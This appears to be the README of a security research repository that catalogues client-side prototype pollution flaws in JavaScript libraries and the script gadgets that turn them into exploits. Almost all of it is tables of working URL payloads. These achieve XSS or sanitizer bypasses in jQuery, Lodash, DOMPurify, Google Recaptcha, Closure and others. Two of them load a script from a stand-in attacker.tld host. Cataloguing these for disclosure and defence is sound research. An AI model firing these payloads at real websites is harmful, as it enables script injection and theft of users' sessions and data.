# Client-Side Prototype Pollution

## Intro

If you are unfamiliar with Prototype Pollution Attack, you should read the following first:  
[JavaScript prototype pollution attack in NodeJS](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) by Olivier Arteau  
[Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) by Michał Bentkowski

In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to `document.location` parsing and useful script gadgets that can be used to demonstrate the impact.

## Prototype Pollution

| Name                                                    | Payload                                                                  | Refs                                        | Found by                                         |
|---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
| Wistia Embedded Video (**Fixed**)                       | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
| [jQuery query-object plugin](/pp/jquery-query-object.md)| `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jQuery Sparkle](/pp/jquery-sparkle.md)                 | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [V4Fire Core Library](/pp/v4fire-core.md)               | `?__proto__.test=test`<br>`?__proto__[test]=test`                        |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [backbone-query-parameters](/pp/backbone-qp.md)         | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jQuery BBQ](/pp/jquery-bbq.md)                         | `?__proto__[test]=test`                                                  |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jquery-deparam](/pp/jquery-deparam.md)                 | `?__proto__[test]=test`                                                  |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |

## Script Gadgets

| Name                                                    | Payload                                                                       | Impact            | Refs                                              | Found by                                            |
|---------------------------------------------------------|-------------------------------------------------------------------------------|-------------------|---------------------------------------------------|-----------------------------------------------------|
| [Wistia Embedded Video](/gadgets/wistia-video.md)       | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>`                            | XSS               | [[1]](https://hackerone.com/reports/986386)       | [William Bowling](https://twitter.com/wcbowling)    |
| [jQuery $.get >= 3.0.0](/gadgets/jquery.md)             | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script`               | XSS               |                                                   | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [jQuery $.getScript >= 3.4.0](/gadgets/jquery.md)       | `?__proto__[src][]=data:,alert(1)//`                                          | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [$.getScript jQuery == 3.3.1](/gadgets/jquery.md)       | `?__proto__.url=data:,alert(1337)//`                                          | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)
| [Google Recaptcha](/gadgets/recaptcha.md)               | `__proto__[srcdoc][]=<script>alert(document.domain)</script>`                 | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)
| [Twitter Universal Website Tag](/gadgets/twitter-uwt.md)| `?__proto__[hif][]=javascript:alert(1)`                                       | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Tealium Universal Tag](/gadgets/tealium-utag.md)       | `?__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js`                | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Akamai Boomerang](/gadgets/akamai-boomerang.md)        | `?__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js`                     | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
| [Lodash <= 4.17.15](/gadgets/lodash.md)                 | `?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)`                            | XSS               | [[1]](https://github.com/lodash/lodash/pull/4518) | [Alex Brasetvik](https://twitter.com/alexbrasetvik) |
| [sanitize-html](/gadgets/sanitize-html.md)              | `?__proto__[*][]=onload`                                                      | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [js-xss](/gadgets/js-xss.md)                            | `?__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src`      | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [DOMPurify <= 2.0.12](/gadgets/dompurify.md)            | `?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src`          | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [DOMPurify <= 2.0.12](/gadgets/dompurify.md)            | `?__proto__[documentMode]=9`                                                  | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Closure](/gadgets/closure.md)                          | `?__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1`                              | Bypass            | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Closure](/gadgets/closure.md)                          | `?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//`                              | XSS               | [[1]](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Marionette.js / Backbone.js](/gadgets/marionette.md)   | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)`   | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
